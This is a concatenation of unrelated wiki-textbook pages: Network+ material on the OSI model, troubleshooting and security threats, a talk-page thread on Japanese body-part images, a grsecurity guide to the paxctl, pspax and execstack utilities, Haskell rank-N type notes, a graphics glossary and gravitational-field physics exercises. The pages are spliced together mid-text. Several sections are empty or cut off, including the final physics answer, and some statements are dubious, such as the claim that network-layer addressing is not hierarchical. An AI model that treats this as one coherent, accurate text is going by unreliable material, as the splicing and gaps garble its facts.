&lt;big&gt;'''Objective 4.1: Explain the function of each layer of the OSI (Open Systems Interconnection) model'''&lt;/big&gt;
__NOTOC__

The Open Systems Interconnection Reference Model (OSI Reference Model or OSI Model) is an abstract description for layered communications and computer network protocol design. In its most basic form, it divides network architecture into seven layers which, from top to bottom, are the Application, Presentation, Session, Transport, Network, Data Link, and Physical Layers. It is therefore often referred to as the OSI Seven Layer Model.

A layer is a collection of conceptually similar functions that provide services to the layer above it and receives service from the layer below it. For example, a layer that provides error-free communications across a network provides the path needed by applications above it, while it calls the next lower layer to send and receive packets that make up the contents of the path.

Reference [[Network_Plus_Certification/Memory_Aids|Appendix A: Memory Aids]] to assist in the recall of the layers in the correct order.

==[[w:OSI_model#Layer_7:_Application_Layer|Application]]==

The application layer is the OSI layer closest to the end user, which means that both the OSI application layer and the user interact directly with the software application. This layer interacts with software applications that implement a communicating component. Application layer functions typically include identifying communication partners, determining resource availability, and synchronizing communication. When identifying communication partners, the application layer determines the identity and availability of communication partners for an application with data to transmit. When determining resource availability, the application layer must decide whether sufficient network resources for the requested communication exist. In synchronizing communication, all communication between applications requires cooperation that is managed by the application layer.

==[[w:OSI_model#Layer_6:_Presentation_Layer|Presentation]]==
The presentation layer establishes context between application-layer entities, in which the higher-layer entities may use different syntax and semantics if the presentation service provides a mapping between them. If a mapping is available, presentation service data units are encapsulated into session protocol data units, and passed down the stack.

This layer provides independence from data representation (e.g., encryption) by translating between application and network formats. The presentation layer transforms data into the form that the application accepts. This layer formats and encrypts data to be sent across a network. It is sometimes called the syntax layer.[5]

The original presentation structure used the basic encoding rules of Abstract Syntax Notation One (ASN.1), with capabilities such as converting an EBCDIC-coded text file to an ASCII-coded file, or serialization of objects and other data structures from and to XML.

==[[w:OSI_model#Layer_5:_Session_Layer|Session]]==
The session layer controls the dialogues (connections) between computers. It establishes, manages and terminates the connections between the local and remote application. It provides for full-duplex, half-duplex, or simplex operation, and establishes checkpointing, adjournment, termination, and restart procedures. The OSI model made this layer responsible for graceful close of sessions, which is a property of the Transmission Control Protocol, and also for session checkpointing and recovery, which is not usually used in the Internet Protocol Suite. The session layer is commonly implemented explicitly in application environments that use remote procedure calls.

==[[w:OSI_model#Layer_4:_Transport_Layer|Transport]]==
The transport layer provides transparent transfer of data between end users, providing reliable data transfer services to the upper layers. The transport layer controls the reliability of a given link through flow control, segmentation/desegmentation, and error control. Some protocols are state- and connection-oriented. This means that the transport layer can keep track of the segments and retransmit those that fail. The transport layer also provides the acknowledgement of the successful data transmission and sends the next data if no errors occurred.

OSI defines five classes of connection-mode transport protocols ranging from class 0 (which is also known as TP0 and provides the least features) to class 4 (TP4, designed for less reliable networks, similar to the Internet). Class 0 contains no error recovery, and was designed for use on network layers that provide error-free connections. Class 4 is closest to TCP, although TCP contains functions, such as the graceful close, which OSI assigns to the session layer. Also, all OSI TP connection-mode protocol classes provide expedited data and preservation of record boundaries. Detailed characteristics of TP0-4 classes are shown in the following table:&lt;ref&gt;{{cite web

Perhaps an easy way to visualize the transport layer is to compare it with a Post Office, which deals with the dispatch and classification of mail and parcels sent. Do remember, however, that a post office manages the outer envelope of mail. Higher layers may have the equivalent of double envelopes, such as cryptographic presentation services that can be read by the addressee only. Roughly speaking, tunneling protocols operate at the transport layer, such as carrying non-IP protocols such as IBM's IBM Systems Network Architecture|SNA or Novell's Internetwork Packet Exchange|IPX over an IP network, or end-to-end encryption with IPsec. While Generic Routing Encapsulation (GRE) might seem to be a network-layer protocol, if the encapsulation of the payload takes place only at endpoint, GRE becomes closer to a transport protocol that uses IP headers but contains complete frames or packets to deliver to an endpoint. layer 2 Tunneling Protocol|L2TP carries Point-to-Point Protocol|PPP frames inside transport packet.

Although not developed under the OSI Reference Model and not strictly conforming to the OSI definition of the transport layer, the Transmission Control Protocol (TCP) and the User Datagram Protocol (UDP) of the Internet Protocol Suite are commonly categorized as layer-4 protocols within OSI.

==[[w:OSI_model#Layer_3:_Network_Layer|Network]]==
The network layer provides the functional and procedural means of transferring variable length data sequences from a source host on one network to a destination host on a different network, while maintaining the quality of service requested by the transport layer (in contrast to the data link layer which connects hosts within the same network). The network layer performs network routing functions, and might also perform fragmentation and reassembly, and report delivery errors. Routers operate at this layer, sending data throughout the extended network and making the Internet possible. This is a logical addressing scheme – values are chosen by the network engineer. The addressing scheme is not hierarchical.

The network layer may be divided into three sublayers:

*Subnetwork access – that considers protocols that deal with the interface to networks, such as X.25;
*Subnetwork-dependent convergence – when it is necessary to bring the level of a transit network up to the level of networks on either side
*Subnetwork-independent convergence – handles transfer across multiple networks.

An example of this latter case is CLNP, or IPv7 ISO 8473. It manages the connectionless transfer of data one hop at a time, from end system to ingress router, router to router, and from egress router to destination end system. It is not responsible for reliable delivery to a next hop, but only for the detection of erroneous packets so they may be discarded. In this scheme, IPv4 and IPv6 would have to be classed with X.25 as subnet access protocols because they carry interface addresses rather than node addresses.

A number of layer-management protocols, a function defined in the Management Annex, ISO 7498/4, belong to the network layer. These include routing protocols, multicast group management, network-layer information and error, and network-layer address assignment. It is the function of the payload that makes these belong to the network layer, not the protocol that carries them.

==[[w:OSI_model#Layer_2:_Data_Link_Layer|Data Link]]==
The data link layer provides the functional and procedural means to transfer data between network entities and to detect and possibly correct errors that may occur in the physical layer. Originally, this layer was intended for point-to-point and point-to-multipoint media, characteristic of wide area media in the telephone system. Local area network architecture, which included broadcast-capable multiaccess media, was developed independently of the ISO work in IEEE Project 802. IEEE work assumed sublayering and management functions not required for WAN use. In modern practice, only error detection, not flow control using sliding window, is present in data link protocols such as Point-to-Point Protocol (PPP), and, on local area networks, the IEEE 802.2 LLC layer is not used for most protocols on the Ethernet, and on other local area networks, its flow control and acknowledgment mechanisms are rarely used. Sliding window flow control and acknowledgment is used at the transport layer by protocols such as TCP, but is still used in niches where X.25 offers performance advantages.

The ITU-T G.hn standard, which provides high-speed local area networking over existing wires (power lines, phone lines and coaxial cables), includes a complete data link layer which provides both error correction and flow control by means of a selective repeat Sliding Window Protocol.

Both WAN and LAN service arrange bits, from the physical layer, into logical sequences called frames. Not all physical layer bits necessarily go into frames, as some of these bits are purely intended for physical layer functions. For example, every fifth bit of the FDDI bit stream is not used by the layer.

==[[w:OSI_model#Layer_1:_Physical_Layer|Physical]]==
The physical layer defines electrical and physical specifications for devices. In particular, it defines the relationship between a device and a transmission medium, such as a copper or optical cable. This includes the layout of pins, voltages, cable specifications, hubs, repeaters, network adapters, host bus adapters (HBA used in storage area networks) and more.

The major functions and services performed by the physical layer are:

*Establishment and termination of a connection to a communications medium.
*Participation in the process whereby the communication resources are effectively shared among multiple users. For example, contention resolution and flow control.
*Modulation, or conversion between the representation of digital data in user equipment and the corresponding signals transmitted over a communications channel. These are signals operating over the physical cabling (such as copper and optical fiber) or over a radio link.

Parallel SCSI buses operate in this layer, although it must be remembered that the logical SCSI protocol is a transport layer protocol that runs over this bus. Various physical-layer Ethernet standards are also in this layer; Ethernet incorporates both this layer and the data link layer. The same applies to other local-area networks, such as token ring, FDDI, ITU-T G.hn and IEEE 802.11, as well as personal area networks such as Bluetooth and IEEE 802.15.4.

Wiring schematics are drawings of where all the wires and circuits are. It also shows where and how they are connected. A wiring schematic is used to troubleshoot problems and to make sure that all the connections have been made and that everything is present.  It assists in the replacement of cabling in case of a short circuit and eases the process of determining where new wires can be installed when additional capacity is needed.

===Throughput testers===
A throughput tester measures the amount of data that can be transferred through a network or processed by a device (such as the amount of data that can be retrieved from disk in a specific period of time). On a network, a throughput tester sends a specific amount of data through the network and measures the time it takes to transfer that data, arriving at a measure of the actual bandwidth. Use a throughput tester to validate the bandwidth on your network, and to identify when the bandwidth is significantly below what it should be. 
Note: A throughput tester can help you identify when a network is slow, but does not give you sufficient information to identify why it is slow.

==[[w:Quality_of_service|QoS (Quality of Service)]]==

Quality of Service (QoS) refers to resource reservation control mechanisms rather than the achieved service quality. Quality of Service is the ability to provide different priority to different applications, users, or data flows, or to guarantee a certain level of performance to a data flow. Quality of Service guarantees are important if the network capacity is insufficient, especially for real-time streaming multimedia applications such as Voice over Internet Protocol, online games and IP-TV, since these often require fixed bit rate and are delay sensitive, and in networks where the capacity is a limited resource, for example in cellular data communication.

An alternative to complex QoS control mechanisms is to provide high quality communication by generously over-provisioning a network so that capacity is based on peak traffic load estimates. This approach is simple and economical for networks with predictable and light traffic loads. The performance is reasonable for many applications. This might include demanding applications that can compensate for variations in bandwidth and delay with large receive buffers, which is often possible for example in video streaming.  In networks typical of enterprises, however, the costs of increasing bandwidth can be substantial and over-provisioning is hard to justify.  In these cases, QoS allows for prioritization of time-sensitive data without the expense of upgrading cabling and equipment.

These steps should be followed in the order that they appear.
{{clear}}

==Information gathering - identify symptoms and problems==
Ask the user to describe the problem, check for error messages, and recreate the problem. Resist the urge to start fixing things at this point.

==Identify the affected areas of the network==
Determine how large the problem is. For example, fixes for one client workstation would likely be very different than fixes for an entire network segment.

==Determine if anything has changed==
Most often, problems are caused by new hardware or software or changes to the configuration. If necessary, ask questions to discover what might have changed that could have caused the problem.

==Establish the most probable cause==
Look for common errors or solutions that can be tried quickly.

==Determine if escalation is necessary==
When forwarding the problem on to someone else, be sure to describe the nature of the problem, the actions you have already taken, and the symptoms that lead you to believe the problem is outside of your area of responsibility.

==Create an action plan and solution identifying potential effects==
Your plan might include purchases for hardware or equipment that need approval before proceeding. In addition, your plan might involve taking some services offline for a period of time. Identifying the affects ahead of time helps you put measures into place to eliminate or reduce any potential negative consequences.

==Implement and test the solution==
When side effects have been weighed against the fix and all concerns have been addressed, fix the problem. If necessary, implement additional steps to correct the problem if your first solution did not work. After you think you have resolved the problem, test the result.

==Identify the results and effects of the solution==
Make sure that the solution has fully fixed the problem and has not caused any other problems.

==Document the solution and the entire process==
In the future, you can check your documentation to see what has changed or to help you remember the solution to common problems.

==Physical issues==

===[[w:Crosstalk_(electronics)|Crosstalk]]===

Crosstalk refers to any phenomenon by which a signal transmitted on one circuit or channel of a transmission system creates an undesired effect in another circuit or channel.  This can occur within the different pairs of wires in a cable and is mitigated by using [[Network_Plus_Certification/Media_and_Topologies/Cables#UTP_.28Unshielded_Twisted_Pair.29|twisted pair cabling]].  In a wireless environment, two different wireless access points that are broadcasting on [[Network_Plus_Certification/Devices/Wireless#Configure_channels_and_frequencies|channels]] too close together in frequency can reduce the quality of the connection between themselves and wireless users.

In telecommunications, crosstalk is often distinguishable as pieces of speech or signaling tones leaking from other people's connections. If the connection is analog, twisted pair cabling can often be used to reduce the effects of crosstalk. Alternatively, the signals can be converted to digital form, which is much less susceptible to crosstalk.

==Logical issues==

===Port speed===

===Port duplex mismatch===
A duplex mismatch occurs when two devices are using different duplex settings. In this case, one device will try to transmit using full duplex, while the other will expect half duplex communications. By default, devices are configured to use autonegotiation to detect the correct duplex setting to use. If a duplex method cannot be agreed upon, devices should default to using half duplex. 
A duplex mismatch can occur in the following cases:
	• Both devices are configured to use different duplex settings. 
	• Autonegotiation does not work correctly on one device. 
	• One device is configured for autonegotiation and the other device is manually configured for full duplex. 

Symptoms of a duplex mismatch include very slow network communications. Ping tests might appear to complete correctly, but normal communications work well below the expected speeds, even for half duplex communications.

===Incorrect VLAN (Virtual Local Area Network)===
Incorrectly assigning a port to a VLAN might prevent a device from communicating through the switch.

===Incorrect IP (Internet Protocol) address===

===Wrong gateway===
If the gateway is configured incorrectly, remote clients can't access network resources, local hosts can't access the Internet and they can't access hosts outside the local subnet.

===Wrong DNS (Domain Name System) server===

===Wrong subnet mask===

==Security threats==

===[[w:Denial-of-service_attack|DoS (Denial of Service)]]===

A denial-of-service attack (DoS attack) or distributed denial-of-service attack (DDoS attack) is an attempt to make a computer resource unavailable to its intended users. Although the means to carry out, motives for, and targets of a DoS attack may vary, it generally consists of the concerted efforts of a person or persons to prevent an Internet site or service from functioning efficiently or at all, temporarily or indefinitely.

One common method of attack involves saturating the target (victim) machine with external communications requests, such that it cannot respond to legitimate traffic, or responds so slowly as to be rendered effectively unavailable. In general terms, DoS attacks are implemented by either forcing the targeted computer(s) to reset, or consuming its resources so that it can no longer provide its intended service or obstructing the communication media between the intended users and the victim so that they can no longer communicate adequately.

[[Network_Plus_Certification/Devices/Common_Devices#Basic_firewall|Firewalls]] have simple rules such as to allow or deny protocols, ports or IP addresses. Some DoS attacks are too complex for today's firewalls, e.g. if there is an attack on port 80 (web service), firewalls cannot prevent that attack because they cannot distinguish good traffic from DoS attack traffic. Additionally, firewalls are too deep in the network hierarchy. Routers may be affected even before the firewall gets the traffic. Nonetheless, firewalls can effectively prevent users from launching simple flooding type attacks from machines behind the firewall.

[[Network_Plus_Certification/Devices/Specialized_Devices#IDS.2FIPS_.28Intrusion_Detection_System.2FIntrusion_Prevention_System.29|Intrusion-prevention systems]] (IPS) are effective if the attacks have signatures associated with them. However, the trend among the attacks is to have legitimate content but bad intent. Intrusion-prevention systems which work on content recognition cannot block behavior based DoS attacks.

===[[w:Computer_virus|Viruses]]===

A computer virus is a computer program that can copy itself and infect a computer without the permission or knowledge of the owner. The term &quot;virus&quot; is also commonly but erroneously used to refer to other types of malware, adware, and spyware programs that do not have the reproductive ability. A true virus can only spread from one computer to another (in some form of executable code) when its host is taken to the target computer; for instance because a user sent it over a network or the Internet, or carried it on a removable medium such as a floppy disk, CD, DVD, or USB drive. 

In order to replicate itself, a virus must be permitted to execute code and write to memory. For this reason, many viruses attach themselves to executable files that may be part of legitimate programs. If a user attempts to launch an infected program, the virus' code may be executed simultaneously.

In order to avoid detection by users, some viruses employ different kinds of deception. Some old viruses, especially on the MS-DOS platform, make sure that the &quot;last modified&quot; date of a host file stays the same when the file is infected by the virus. This approach does not fool anti-virus software, however. Some viruses can infect files without increasing their sizes or damaging the files. They accomplish this by overwriting unused areas of executable files. These are called cavity viruses. 
Some viruses try to avoid detection by killing the tasks associated with antivirus software before it can detect them. As computers and operating systems grow larger and more complex, old hiding techniques need to be updated or replaced. Defending a computer against viruses may demand that a file system migrate towards detailed and explicit permission for every kind of file access.

== Body parts image ==
I think it would probably be helpful, and something to think about, to have a picture of the body part in question. (i.e. head, arm, neck)  This way, it would help associate the word with the picture. [[User:Atomicblue|Atomicblue]] ([[User talk:Atomicblue|talk]]) 03:27, 23 April 2009 (UTC)

: Yes, it would be a nice addition. Please feel free to contribute that if you are able.
: A simple addition would be to just find a couple of nice images from Wikimedia Commons; one of the body, the other of the face, and add the terms (in Japanese) to that.
: An great extension to that would be a simple software application that drilled the bodyparts.
: I'm working on other things right now, but feel free to contact me if you'd like to collaborate on that, or just bounce ideas of someone. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 04:04, 23 April 2009 (UTC)</text>

__TOC__

This page will introduce you to some additional utilities. They are not required to use a grsecurity-enabled system, but are very useful and thus recommended.

== Controlling PaX Flags (paxctl) ==

&lt;tt&gt;Paxctl&lt;/tt&gt; is a user-space utility for controlling PaX flags of executables (see [[../Appendix/PaX_Flags|Appendix/PaX Flags]] for a list of these flags).

Download the latest version from the PaX website at http://pax.grsecurity.net/. In our case we downloaded ''paxctl-0.7.tar.bz2''. &lt;tt&gt;Paxctl&lt;/tt&gt; packages are not signed. Change into the directory you downloaded the package to and run the below commands.

&lt;pre&gt;
$ tar xjf paxctl-0.7.tar.bz2
$ cd paxctl-0.7
$ make
$ su
# make install
&lt;/pre&gt;

The installation process does the following:
* Installs the &lt;tt&gt;paxctl&lt;/tt&gt; program to ''/sbin''.
* Installs &lt;tt&gt;paxctl&lt;/tt&gt;'s man pages to ''/usr/share/man/man1''.

If you need to change either of these locations, modify the ''Makefile''.

=== Usage ===

To display all available command-line switches, run &lt;tt&gt;paxctl --help&lt;/tt&gt;. Read the man page for more detailed information.

&lt;pre&gt;
# paxctl --help
PaX control v0.7
Copyright 2004,2005,2006,2007,2009,2010,2011,2012 PaX Team &lt;pageexec@freemail.hu&gt;

usage: paxctl &lt;options&gt; &lt;files&gt;

options:
        -p: disable PAGEEXEC            -P: enable PAGEEXEC
        -e: disable EMUTRAMP            -E: enable EMUTRAMP
        -m: disable MPROTECT            -M: enable MPROTECT
        -r: disable RANDMMAP            -R: enable RANDMMAP
        -x: disable RANDEXEC            -X: enable RANDEXEC
        -s: disable SEGMEXEC            -S: enable SEGMEXEC

        -v: view flags                  -z: restore default flags
        -q: suppress error messages     -Q: report flags in short format
        -c: convert PT_GNU_STACK into PT_PAX_FLAGS (see manpage!)
        -C: create PT_PAX_FLAGS (see manpage!)
&lt;/pre&gt;

=== Examples ===

Lets query what, if any, PaX flags have been enabled for &lt;tt&gt;/usr/bin/vi&lt;/tt&gt;:
&lt;pre&gt;
# paxctl -v /usr/bin/vi
PaX control v0.7
Copyright 2004,2005,2006,2007,2009,2010,2011,2012 PaX Team &lt;pageexec@freemail.hu&gt;

file /usr/bin/vi does not have a PT_PAX_FLAGS program header, try conversion
&lt;/pre&gt;

As you can see, &lt;tt&gt;paxctl&lt;/tt&gt; could not display the flags because &lt;tt&gt;vi&lt;/tt&gt; does not have the appropriate program header. We need to convert the header and query the flags again.

{{XWarning|Note that &lt;tt&gt;paxctl&lt;/tt&gt; does not make backup copies of the files it modifies. It is recommended that you make backups of the binaries you want to modify.}}

&lt;pre&gt;
# paxctl -c /usr/bin/vi
file /usr/bin/vi had a PT_GNU_STACK program header, converted

# paxctl -v /usr/bin/vi
PaX control v0.7
Copyright 2004,2005,2006,2007,2009,2010,2011,2012 PaX Team &lt;pageexec@freemail.hu&gt;

- PaX flags: -------x-e-- [/usr/bin/vi]
        RANDEXEC is disabled
        EMUTRAMP is disabled
&lt;/pre&gt;

With the appropriate program header in place, we can query and modify the PaX flags of &lt;tt&gt;vi&lt;/tt&gt;.

== Displaying Program Capabilities (pspax) ==

The &lt;tt&gt;pspax&lt;/tt&gt; program displays the run-time capabilities of all programs you have permission for. It is part of the &lt;tt&gt;pax-utils&lt;/tt&gt; package. &lt;tt&gt;Pax-utils&lt;/tt&gt; can be found at http://dev.gentoo.org/~vapier/dist/. It contains many useful tools for [[w:PaX|PaX]] but is not as critical as &lt;tt&gt;paxctl&lt;/tt&gt;. The &lt;tt&gt;pax-utils&lt;/tt&gt; package is maintained by the [http://www.gentoo.org/proj/en/hardened/ Hardened Gentoo Project].

Programs that the pax-utils package provides:
* &lt;tt&gt;pspax&lt;/tt&gt; - Displays the run-time capabilities of all programs you have permission for.
* &lt;tt&gt;scanelf&lt;/tt&gt; - Prints out information specific to the [[w:Executable_and_Linkable_Format|ELF]] structure of a binary.
* &lt;tt&gt;dumpelf&lt;/tt&gt; - Converts a ELF file into human readable [[w:C_(programming_language)|C code]] that defines a structure with the same image as the original ELF file.

For more information, see the [http://www.gentoo.org/proj/en/hardened/pax-utils.xml Gentoo Linux guide to pax-utils].

=== Installation ===

Gentoo Linux and [[w:Debian|Debian GNU/Linux]] users (and possibly others) can install the &lt;tt&gt;pax-utils&lt;/tt&gt; package the same way they install any other application in their system. Below are instructions on how to compile and install it from the source.

Download the latest version from http://dev.gentoo.org/~vapier/dist/. In our case we downloaded ''pax-utils-0.4.tar.xz'', the latest stable release at the time of writing. Change into the directory you downloaded the package to and run the below commands.
&lt;pre&gt;
$ tar xJf pax-utils-0.4.tar.xz
$ cd pax-utils-0.4
$ make
$ su
# make install
&lt;/pre&gt;

The installation process does the following:
* Installs the &lt;tt&gt;pspax&lt;/tt&gt;, &lt;tt&gt;scanelf&lt;/tt&gt;, &lt;tt&gt;dumpelf&lt;/tt&gt; and &lt;tt&gt;scanmacho&lt;/tt&gt; programs to ''/usr/bin''.
* Installs README, BUGS, and TODO files to ''/usr/share/doc/pax-utils/''.
* Installs man pages of &lt;tt&gt;pspax&lt;/tt&gt;, &lt;tt&gt;scanelf&lt;/tt&gt; and &lt;tt&gt;dumpelf&lt;/tt&gt; to ''/usr/share/man/man1''.

If you need to change any of these locations, modify the ''Makefile''.

=== Usage ===

To display all available command-line switches, run &lt;tt&gt;pspax --help&lt;/tt&gt;. Read the man page for more detailed information.

&lt;pre&gt;
$ pspax --help
* List ELF/PaX information about running processes

Usage: pspax [options]

Options:
  -a, --all         * Show all processes
  -e, --header      * Print GNU_STACK/PT_LOAD markings
  -i, --ipaddr      * Print ipaddr info if supported
  -p, --pid         * Process ID/pid #
  -u, --user        * Process user/uid #
  -g, --group       * Process group/gid #
  -n, --nx          * Only display w^x processes
  -w, --wx          * Only display w|x processes
  -W, --wide        * Wide output display of cmdline
  -v, --verbose     * Be verbose about executable mappings
  -C, --nocolor     * Don't emit color in output
  -B, --nobanner    * Don't display the header
  -h, --help        * Print this help and exit
  -V, --version     * Print version and exit
&lt;/pre&gt;

&lt;tt&gt;Pspax&lt;/tt&gt; shows the PaX flags of a single program as a string of characters (e.g. &quot;peMRS&quot;). Lowercase character means the flag is disabled, uppercase means it is enabled. Below is a table that shows these characters and their corresponding PaX flags used by grsecurity. The &quot;Details&quot; column contains a link to a detailed explanation of each flag.

=== Examples ===

The command &lt;tt&gt;pspax -p &lt;process_id&gt;&lt;/tt&gt; displays information about a specific process, identified by its PID. It is unlikely that you happen to know or remember the PID of a process, so it is easier to refer to them by name. The below example uses the &lt;tt&gt;pidof&lt;/tt&gt; command to find the PID of a process which it then passes on to &lt;tt&gt;pspax&lt;/tt&gt;:

&lt;pre&gt;
# pidof inetd | xargs pspax -p
USER     PID    PAX    MAPS ETYPE      NAME             CAPS_ATTR
root     1741   peMRS  w^x  ET_EXEC    inetd            =ep cap_setpcap-ep
&lt;/pre&gt;

== Managing the Executable Stack of Binaries (execstack) ==

&lt;tt&gt;Execstack&lt;/tt&gt; is a tool to set, clear or query executable stack flag of [[w:Executable_and_Linkable_Format|ELF]] binaries and shared libraries. It is part of the &lt;tt&gt;[[w:Prelink|prelink]]&lt;/tt&gt; program, but your Linux distribution may provide it as a separate package.

=== Installation ===

You are very likely to find the &lt;tt&gt;prelink&lt;/tt&gt; and/or &lt;tt&gt;execstack&lt;/tt&gt; packages using your distribution's package management system. At least Gentoo, Debian, Red Hat and distributions based on them provide a &lt;tt&gt;prelink&lt;/tt&gt; and/or &lt;tt&gt;execstack&lt;/tt&gt; packages.

=== Usage ===

To display all available command-line switches, run &lt;tt&gt;execstack --help&lt;/tt&gt;. Read the man page for more detailed information. Online version of the man page can be found at http://linux.die.net/man/8/execstack.

&lt;pre&gt;
# execstack --help
Usage: execstack [OPTION...]
execstack -- program to query or set executable stack flag

  -c, --clear-execstack      Clear executable stack flag bit
  -q, --query                Query executable stack flag bit
  -s, --set-execstack        Set executable stack flag bit
  -?, --help                 Give this help list
      --usage                Give a short usage message
  -V, --version              Print program version

Report bugs to &lt;jakub@redhat.com&gt;.
&lt;/pre&gt;

=== Examples ===

To check if a library has executable stack enabled, run:
&lt;pre&gt;
# execstack -q /usr/lib/libcrypto.so.0.9.8
- /usr/lib/libcrypto.so.0.9.8
&lt;/pre&gt;

The dash means libcrypto does not require an executable stack. If it did, the line would start with a capital &quot;X&quot; instead of a dash.

To query the status of all libraries in your system, run:
&lt;pre&gt;
# find /lib /usr/lib -name '*.so.*.*.*' | xargs execstack
&lt;/pre&gt;

=== Higher Rank types ===
Our example &lt;code&gt;foo&lt;/code&gt; is said to have a '''rank-2 type'''. There are other ranks as well. Counting begins with ordinary polymorphic functions like

  id  :: forall a. a -&gt; a
  map :: forall a. [a] -&gt; [a]

which are said to have rank-1 types. Functions with rank-1 types as arguments have rank-2 types. Examples include

  f2  :: (forall a. a -&gt; a -&gt; a) -&gt; Int -&gt; Int
  g2  :: (forall a. Eq a =&gt; [a] -&gt; a -&gt; Bool) -&gt; Int -&gt; Int

A function like 

  f3  :: ((forall a. a -&gt; a -&gt; a) -&gt; Int) -&gt; Bool -&gt; Bool

with a rank-2 type on the left of the function arrow is said to have a rank-3 type and so on.

What rank does

  const :: forall a. a -&gt; (forall b. b -&gt; a)

have? It's the same as

  const :: forall a. forall b. a -&gt; b -&gt; a

and therefor a rank-1 type. In other words, a &lt;code&gt;forall&lt;/code&gt; can be moved to the front when it's on the ''right'' of a function arrow, i.e. in the result position. Only quantifiers on the ''left'' of a function arrow, that is in the argument position, increase the rank and cannot be moved to the front.

== Other types of polymorphism ==

At the [http://en.wikibooks.org/wiki/Haskell/Polymorphism#Other_forms_of_Polymorphism end of the article]: ''&quot;ad-hoc polymorphism = different behavior depending on type s. =&gt; Haskell type classes&quot;''

Actually I think haskell type classes are an example of [http://en.wikipedia.org/wiki/Polymorphism_(computer_science)#Bounded_parametric_polymorphism Bounded parametric polymorphism]

== Need Clarification? ==

In GHC 7.0.4 I could not find an example function that satisfied the code below provided in the main text.
&lt;source lang=&quot;haskell&quot;&gt;
  foo :: (forall a. a -&gt; a) -&gt; (Char,Bool)
  foo f = (f 'c', f True)
&lt;/source&gt;

However the below will run.

&lt;source lang=&quot;haskell&quot;&gt;
{-# LANGUAGE Rank2Types #-}
-- or {-# LANGUAGE RankNTypes #-}

import Data.Char (toLower)

class Poly a where
    f :: a -&gt; a

instance Poly Char where
    f c = toLower c

instance Poly Bool where
    f b = not b

foo :: (forall a. Poly a =&gt; a -&gt; a) -&gt; (Char, Bool)
foo f = (f 'c', f False)
&lt;/source&gt;</text>

==C==
; channel : There are two types. 1. A grayscale layer of a primary color. Channels depend on the image type. Channels in an RGB image would contain a Red channel, a Green channel and a Blue channel. Channels in a CMYK image would contain a Cyan channel, a Magenta channel, a Yellow channel and a Black channel. A grayscale image would only have one channel, a Gray channel. 2. A user created channel is a grayscale layer. They are often used to save selections.

==G==
; Gaussian blur : A filter that blurs an image.
; gradient : A smooth blend from one color to another. They come in various shapes, but the most common is the linear gradient.

==J==
; JPEG : A lossy raster image format.

==L==
; layer : A part of an image, one which can be transparent, translucent or opaque, that, together with other layers, gets stacked up to form the image.

==M==
; magic wand  : A tool for selecting areas of image or layer with the similar colour.

==P==
; pixel : A basic element of a raster image, having the shape of a single-colored square.
; PNG : A lossless raster image format.

      <text xml:space="preserve">The gravitational field, or gravitational field strength is the force exerted by gravity on an object per. unit mass of the object:


&lt;math&gt;g = \frac{F_{grav}}{m}&lt;/math&gt;


As gravitational field strength is a measure of the force exerted on each unit of mass, its unit is Nkg&lt;sup&gt;-1&lt;/sup&gt;. If we consider a planet, Body A, the gravitational field strength experienced by another object, Body B, is given by:


&lt;math&gt;g = \frac{\frac{-GMm}{r^2}}{m} = \frac{-GM}{r^2}&lt;/math&gt;


This is the total force exerted on Body B divided by the mass of Body B. Inside the planet, force is proportional to the distance from the centre, so the field is also proportional to distance.

==Acceleration==
Force is given by:

&lt;math&gt;F = ma&lt;/math&gt;

This means that:


&lt;math&gt;g = \frac{ma}{m} = a&lt;/math&gt;


This shows that the gravitational field strength is also the acceleration due to gravity on any object. This acceleration is the same for any object, regardless of mass. When considering small heights above the Earth's surface, such as those in our day-to-day experiences, g remains roughly constant.

==Field Lines==
[[Image:Gravity_field_lines.svg|thumb|right|200px|Gravitational field lines around the Earth.]]
The gravitational field can be represented using field lines. These run in the direction that a mass would be accelerated in initially. The object will not necessarily fall along the field lines, but the acceleration will always be in the direction of the field lines. The closer the field lines are together, the denser the gravitational field.

==Questions==
G = 6.67 x 10&lt;sup&gt;-11&lt;/sup&gt; m&lt;sup&gt;3&lt;/sup&gt;kg&lt;sup&gt;-1&lt;/sup&gt;s&lt;sup&gt;-2&lt;/sup&gt;

1. A 15kg object has a weight of 8000N. What is the gravitational field strength at this point?

2. Draw a graph of gravitational field strength against distance.

3. What is the gravitational field strength of the Sun (mass 2 x 10&lt;sup&gt;30&lt;/sup&gt;kg) on the Earth (mass 6 x 10&lt;sup&gt;24&lt;/sup&gt;kg, mean orbital radius 15 x 10&lt;sup&gt;10&lt;/sup&gt;m)?

4. What is the difference in the acceleration due to gravity over a vertical distance d?

5. How far would one have to travel upwards from the Earth's surface to notice a 1Nkg&lt;sup&gt;-1&lt;/sup&gt; difference in gravitational field? (The Earth has a radius of 6400 km.)

      <text xml:space="preserve">G = 6.67 x 10&lt;sup&gt;-11&lt;/sup&gt; m&lt;sup&gt;3&lt;/sup&gt;kg&lt;sup&gt;-1&lt;/sup&gt;s&lt;sup&gt;-2&lt;/sup&gt;

'''1. A 15kg object has a weight of 8000N. What is the gravitational field strength at this point?'''

&lt;math&gt;g = \frac{F_{grav}}{m} = \frac{8000}{15} = 533\mbox{ Nkg}^{-1}&lt;/math&gt;

'''2. Draw a graph of gravitational field strength against distance.'''

[[Image:Grav_field_sphere.svg]]

Since gravitational field strength is proportional to gravitational force, the two graphs look very similar.

'''3. What is the gravitational field strength of the Sun (mass 2 x 10&lt;sup&gt;30&lt;/sup&gt;kg) on the Earth (mass 6 x 10&lt;sup&gt;24&lt;/sup&gt;kg, mean orbital radius 15 x 10&lt;sup&gt;10&lt;/sup&gt;m)?'''

&lt;math&gt;g = \frac{GM}{r^2} = \frac{6.67 \times 10^{-11} \times 2 \times 10^{30}}{(15 \times 10^{10})^2} = 5.93\mbox{ mNkg}^{-1}&lt;/math&gt;

'''4. What is the difference in the acceleration due to gravity over a vertical distance d?'''

&lt;math&gt;\Delta g = \frac{GM}{(r + d)^2} - \frac{GM}{r^2} = GM\left ( \frac{1}{(r + d)^2} - \frac{1}{r^2}\right ) = \frac{GM(r^2 - (r + d)^2)}{r^2(r + d)^2} = \frac{GM(r^2 - r^2 - 2rd - d^2)}{r^2(r + d)^2} = \frac{-GMd(2r + d)}{r^2(r + d)^2}&lt;/math&gt;

'''5. How far would one have to travel upwards from the Earth's surface to notice a 1Nkg&lt;sup&gt;-1&lt;/sup&gt; difference in gravitational field? (The Earth has a radius of 6400 km.)'''

&lt;math&gt;1 = \frac{GMd(2r + d)}{r^2(r + d)^2}&lt;/math&gt;

&lt;math&gt;GMd(2r + d) = r^2(r + d)^2&lt;/math&gt;

